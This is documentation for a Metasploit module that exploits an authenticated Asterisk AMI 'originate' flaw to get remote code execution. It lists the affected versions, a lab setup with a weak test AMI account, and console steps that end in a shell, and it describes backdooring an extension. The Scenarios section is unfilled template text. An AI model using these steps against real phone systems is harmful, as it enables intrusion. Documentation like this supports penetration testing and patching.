## Vulnerable Application

On Asterisk, prior to versions 18.24.2, 20.9.2, and 21.4.2 and certified-asterisk
versions 18.9-cert11 and 20.7-cert2, an AMI user with 'write=originate' may change
all configuration files in the '/etc/asterisk/' directory. Writing a new extension
can be created which performs a system command to achieve RCE as the asterisk service
user (typically asterisk).

Default parking lot in FreePBX is called "Default lot" on the website interface,
however its actually 'parkedcalls'.

Tested against Asterisk 19.8.0 on Freepbx SNG7-PBX16-64bit-2302-1.

Asterisk 18.6.0 on Freepbx SNG7-PBX16-64bit-2302-1 was NOT exploitable.

### Install

One easy method is using the FreePBX ISO (while outdated).

visit :80
set it up, make sure to not do updates.
login
FreePBX Administration
hamburger > Applications > Parking
click the red "Apply Config" button at the top, this should start the asterisk service

1. Login (ssh/local) and edit `/etc/asterisk/manager.conf`
  1. Under `[general]`:
    1. Change `bindaddr` value to `0.0.0.0`
    1. If you'd like to test the version checking, grab admin's secret, and set `permit=0.0.0.0/0.0.0.0`
    1. Add the following at the bottom of the file:
    ```
[testuser]
secret=testuser
write=originate
permit=0.0.0.0/255.255.255.0
    ```
2. reboot box (after boot, it may take SEVERAL minutes for asterisk to come up)



Default parking lot is called "Default lot" in the website interface, however its actually parkedcalls

## Verification Steps

1. Install the application
1. Start msfconsole
1. Do: `use exploit/linux/misc/asterisk_ami_originate_auth_rce `
1. Do: `set rhosts <rhost>`
1. Do: `set lhost <lhost>`
1. Do: `set username <username>`
1. Do: `set password <password>`
1. You should get a shell.

## Options

### CONF

The extensions configuration file location. Defaults to `/etc/asterisk/extensions.conf`

### PARKINGLOT

The extensions and name of the parking lot. Defaults to `70@parkedcalls`

### EXTENSION

The extension number to backdoor. Defaults to a random number between 3-5 numbers.

## Scenarios
Specific demo of using the module that might be useful in a real world scenario.

### Version and OS

```
code or console output
```

For example:

To do this specific thing, here's how you do it:

```
msf > use module_name
msf auxiliary(module_name) > set POWERLEVEL >9000
msf auxiliary(module_name) > exploit
```
